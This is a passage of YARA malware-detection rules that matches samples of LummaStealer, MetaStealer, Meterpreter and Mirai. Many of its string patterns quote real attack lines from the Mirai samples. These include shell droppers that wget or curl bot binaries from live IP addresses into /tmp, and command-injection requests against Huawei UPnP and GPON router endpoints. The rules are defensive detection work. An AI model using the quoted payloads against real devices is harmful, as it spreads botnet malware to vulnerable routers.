      hash1 = "774fb7558e15974f9104952da1999a885312876fcbb0c3fc1de65a45948c213b"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v1.89.6-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "* kl`H" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__9672146b {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_9672146b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9672146b45c58f0b74731f58dc3849988b51dc451bea41ed6f75b89579b9349f"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v9.23.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__88e9ae31 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_88e9ae31.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "88e9ae317e3475aafee18b2c1445e81e25e08f545702f2d7cebf270058553764"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v7.84.4-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "* 9a9i" fullword ascii /* score: '9.00'*/
      $s4 = " NKBR -\"" fullword ascii /* score: '8.00'*/
      $s5 = "wZhNz -" fullword ascii /* score: '8.00'*/
      $s6 = "YFof v -8" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__e05cbfad {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_e05cbfad.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e05cbfadb34e18c3c6e9a33c82d1dbf87a2157961a0193f18d4d53b99ee72d0d"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v6.88.1-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__44d8a197c84278da32b54956d7f26e65_imphash__33be2f32 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_44d8a197c84278da32b54956d7f26e65(imphash)_33be2f32.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "33be2f32f4c9569dc85efe8b77f622f625e36c2c242616942f7a96bfcbdd0220"
   strings:
      $s1 = "- -gB\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule MassLogger_signature__2 {
   meta:
      description = "_subset_batch - file MassLogger(signature).xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9bd11fe90ac658c0a700ac9a407812b54c921a995c0f3294f408ff56c78494ef"
   strings:
      $s1 = "* z7$X" fullword ascii /* score: '9.00'*/
      $s2 = "`5$\",@+A" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Z' */
      $s3 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 8000KB and
      all of them
}

rule MetaStealer_signature__2 {
   meta:
      description = "_subset_batch - file MetaStealer(signature).cab"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0218fd850ca27f53b2ad0d7938d1c1bdcede54fdc1259741ba3ed48666f63e8c"
   strings:
      $s1 = "setup8491.exe" fullword ascii /* score: '22.00'*/
      $s2 = "QmQmQmQmQm" fullword ascii /* base64 encoded string 'Bd&Bd&B' */ /* score: '14.00'*/
      $s3 = "EyEyEyEyEyEyEy" fullword ascii /* score: '9.00'*/
      $s4 = "NgET'_4" fullword ascii /* score: '9.00'*/
      $s5 = "wwwwwwwwwwrw" fullword ascii /* score: '8.00'*/
      $s6 = "wwwwwwwwwwwwwwwwwwwwbw" fullword ascii /* score: '8.00'*/
      $s7 = "~ %NZCwH%f" fullword ascii /* score: '8.00'*/
      $s8 = "wwwwwwwwwwbw" fullword ascii /* score: '8.00'*/
      $s9 = "wwwwwwwwrw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x534d and filesize < 17000KB and
      all of them
}

rule MetaStealer_signature__3 {
   meta:
      description = "_subset_batch - file MetaStealer(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0f6f1805d66f8fbda21e8baf59e95e5059ef6837db7d5af93e6dad09523abbcd"
   strings:
      $s1 = "Readme.pdf.lnk" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 3KB and
      all of them
}

rule MetaStealer_signature__8e6473c2 {
   meta:
      description = "_subset_batch - file MetaStealer(signature)_8e6473c2.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8e6473c26b957b17e1510152359218990d00dfeaa166488df384e790078b6448"
   strings:
      $s1 = "microsoft.exeux" fullword ascii /* score: '11.00'*/
      $s2 = "BU.logY" fullword ascii /* score: '10.00'*/
      $s3 = "8W- -K" fullword ascii /* score: '9.00'*/
      $s4 = "E#.TXT*" fullword ascii /* score: '8.00'*/
      $s5 = "v3%s%x" fullword ascii /* score: '8.00'*/
      $s6 = "dxsbxql" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 16000KB and
      all of them
}

rule Meterpreter_signature__b4c6fff030479aa3b12625be67bf4914_imphash_ {
   meta:
      description = "_subset_batch - file Meterpreter(signature)_b4c6fff030479aa3b12625be67bf4914(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7f019174b92dbf890bd720c24168d4009202ca90576320a30a1a55d9a2f24ada"
   strings:
      $s1 = "PAYLOAD:" fullword ascii /* score: '13.00'*/
      $s2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

rule Mirai_signature_ {
   meta:
      description = "_subset_batch - file Mirai(signature).elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8c9f2f7075b94037df0c51e200c4e624c5ec351321287754e4ea88a9fd1d7d51"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s4 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox w" ascii /* score: '15.00'*/
      $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii /* score: '12.00'*/
      $s6 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii /* score: '12.00'*/
      $s7 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s8 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '10.00'*/
      $s9 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s10 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii /* score: '9.00'*/
      $s11 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s12 = "killattk" fullword ascii /* score: '8.00'*/
      $s13 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s14 = "assword" fullword ascii /* score: '8.00'*/
      $s15 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__067d7dcc {
   meta:
      description = "_subset_batch - file Mirai(signature)_067d7dcc.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "067d7dcced0ad1e6302da96e82316f13293f59cbd9dc62818831c3e74f7c3645"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s4 = "auth.binaries.lol" fullword ascii /* score: '16.00'*/
      $s5 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox w" ascii /* score: '15.00'*/
      $s6 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii /* score: '12.00'*/
      $s7 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii /* score: '12.00'*/
      $s8 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s9 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '10.00'*/
      $s10 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s11 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii /* score: '9.00'*/
      $s12 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s13 = "killattk" fullword ascii /* score: '8.00'*/
      $s14 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s15 = "assword" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__0864e7ab {
   meta:
      description = "_subset_batch - file Mirai(signature)_0864e7ab.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0864e7ab06e5f39bfa5c9200ecfeb70d0a1de86eb7e7ae038697e1b0db60c86f"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s4 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox w" ascii /* score: '15.00'*/
      $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii /* score: '12.00'*/
      $s6 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii /* score: '12.00'*/
      $s7 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s8 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '10.00'*/
      $s9 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s10 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii /* score: '9.00'*/
      $s11 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s12 = "killattk" fullword ascii /* score: '8.00'*/
      $s13 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s14 = "assword" fullword ascii /* score: '8.00'*/
      $s15 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__0ae4ca42 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0ae4ca42.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0ae4ca42cebf46220acaf97ef4eaba3533d71c8a20a099a143e6b25f6cf62d8a"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /kvariant.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDown" ascii /* score: '20.00'*/
      $s3 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s4 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox w" ascii /* score: '15.00'*/
      $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii /* score: '12.00'*/
      $s6 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii /* score: '12.00'*/
      $s7 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s8 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '10.00'*/
      $s9 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s10 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii /* score: '9.00'*/
      $s11 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s12 = "killattk" fullword ascii /* score: '8.00'*/
      $s13 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s14 = "assword" fullword ascii /* score: '8.00'*/
      $s15 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__12f99cc9 {
   meta:
      description = "_subset_batch - file Mirai(signature)_12f99cc9.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "12f99cc9e69c3bbcc012afa80e57635811e323ec5bc6cda92d76a7d3f88d2cf4"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '46.00'*/
      $s2 = "GET /shell?cd+/tmp;rm+-rf+*;wget+45.90.12.71/jaws;sh+/tmp/jaws HTTP/1.1" fullword ascii /* score: '29.00'*/
      $s3 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.90.12.71/bin+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0" fullword ascii /* score: '25.00'*/
      $s4 = "User-Agent: Hello, world" fullword ascii /* score: '22.00'*/
      $s5 = " -g 45.90.12.71 -l /tmp/.hiroshima -r /596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.mips; /bin/busybox chmo" ascii /* score: '22.00'*/
      $s6 = "User-Agent: Hello, World" fullword ascii /* score: '22.00'*/
      $s7 = "d 777 * /tmp/.hiroshima; /tmp/.hiroshima huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Up" ascii /* score: '21.00'*/
      $s8 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s9 = "POST /GponForm/diag_Form?style/ HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s10 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox w" ascii /* score: '15.00'*/
      $s11 = "Host: 127.0.0.1:80" fullword ascii /* score: '14.00'*/
      $s12 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s13 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii /* score: '12.00'*/
      $s14 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii /* score: '12.00'*/
      $s15 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__0dcfafb5 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0dcfafb5.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0dcfafb58cd5d98aa5f1ee9672ee2a363f6d8b7b87d32038dd79712f13fb0bf8"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__12d7b4ad {
   meta:
      description = "_subset_batch - file Mirai(signature)_12d7b4ad.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "12d7b4adf204885c39f5c8d6ea753c177425b0f74f46377ba35eb2bd8c7d0bea"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__2 {
   meta:
      description = "_subset_batch - file Mirai(signature).sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cc9919d8303ef109a656b625353ffc830cca51ba4d611a1800fe9f27b868754c"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://95.169.180.94/arm6 || curl -s -O http://95.169.180.94/arm6" ascii /* score: '34.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://95.169.180.94/sh4 || curl -s -O http://95.169.180.94/sh4; " ascii /* score: '34.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://95.169.180.94/arm7 || curl -s -O http://95.169.180.94/arm7" ascii /* score: '34.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://95.169.180.94/x86 || curl -s -O http://95.169.180.94/x86; " ascii /* score: '34.00'*/
      $x5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://95.169.180.94/arm5 || curl -s -O http://95.169.180.94/arm5" ascii /* score: '34.00'*/
      $x6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://95.169.180.94/ppc || curl -s -O http://95.169.180.94/ppc; " ascii /* score: '34.00'*/
      $x7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://95.169.180.94/spc || curl -s -O http://95.169.180.94/spc; " ascii /* score: '34.00'*/
      $x8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://95.169.180.94/mips || curl -s -O http://95.169.180.94/mips" ascii /* score: '34.00'*/
      $x9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://95.169.180.94/m68k || curl -s -O http://95.169.180.94/m68k" ascii /* score: '34.00'*/
      $x10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://95.169.180.94/mpsl || curl -s -O http://95.169.180.94/mpsl" ascii /* score: '34.00'*/
      $x11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://95.169.180.94/arm || curl -s -O http://95.169.180.94/arm; " ascii /* score: '34.00'*/
      $x12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://95.169.180.94/arm5 || curl -s -O http://95.169.180.94/arm5" ascii /* score: '31.00'*/
      $x13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://95.169.180.94/ppc || curl -s -O http://95.169.180.94/ppc; " ascii /* score: '31.00'*/
      $x14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://95.169.180.94/spc || curl -s -O http://95.169.180.94/spc; " ascii /* score: '31.00'*/
      $x15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://95.169.180.94/arm7 || curl -s -O http://95.169.180.94/arm7" ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 4KB and
      1 of ($x*)
}

rule Mirai_signature__0138519a {
   meta:
      description = "_subset_batch - file Mirai(signature)_0138519a.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0138519aadcdec86657ef3ecd5056d90f8f64e1d8acde760106dd51e2e4c9a4d"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.176.85/hiddenbin/boatnet.spc; curl -O http://69.197.17" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.176.85/hiddenbin/boatnet.arc; curl -O http://69.197.17" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.176.85/hiddenbin/boatnet.ppc; curl -O http://69.197.17" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.176.85/hiddenbin/boatnet.arm; curl -O http://69.197.17" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.176.85/hiddenbin/boatnet.arc; curl -O http://69.197.17" ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.176.85/hiddenbin/boatnet.arm; curl -O http://69.197.17" ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.176.85/hiddenbin/boatnet.spc; curl -O http://69.197.17" ascii /* score: '29.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.176.85/hiddenbin/boatnet.ppc; curl -O http://69.197.17" ascii /* score: '29.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.176.85/hiddenbin/boatnet.arm5; curl -O http://69.197.1" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.176.85/hiddenbin/boatnet.arm7; curl -O http://69.197.1" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.176.85/hiddenbin/boatnet.i686; curl -O http://69.197.1" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.176.85/hiddenbin/boatnet.m68k; curl -O http://69.197.1" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.176.85/hiddenbin/boatnet.sh4; curl -O http://69.197.17" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.176.85/hiddenbin/boatnet.mpsl; curl -O http://69.197.1" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.176.85/hiddenbin/boatnet.i468; curl -O http://69.197.1" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__02f5703f {
   meta:
      description = "_subset_batch - file Mirai(signature)_02f5703f.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "02f5703f8837a87ff836a2ee408d9001d8d4999bdbc521fff9ce6ba798afe97d"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.191/00101010101001/morte.arm; curl -O http://176.6" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.191/00101010101001/morte.ppc; curl -O http://176.6" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.191/00101010101001/morte.spc; curl -O http://176.6" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.191/00101010101001/morte.arc; curl -O http://176.6" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.191/00101010101001/morte.mpsl; curl -O http://176." ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.191/00101010101001/morte.mips; curl -O http://176." ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.191/00101010101001/morte.arm6; curl -O http://176." ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.191/00101010101001/morte.arm7; curl -O http://176." ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.191/00101010101001/morte.x86_64; curl -O http://17" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.191/00101010101001/morte.arm; curl -O http://176.6" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.191/00101010101001/morte.arm5; curl -O http://176." ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.191/00101010101001/morte.ppc; curl -O http://176.6" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.191/00101010101001/morte.sh4; curl -O http://176.6" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.191/00101010101001/morte.i686; curl -O http://176." ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.148.191/00101010101001/morte.i468; curl -O http://176." ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 9KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__09dad71f {
   meta:
      description = "_subset_batch - file Mirai(signature)_09dad71f.sh"
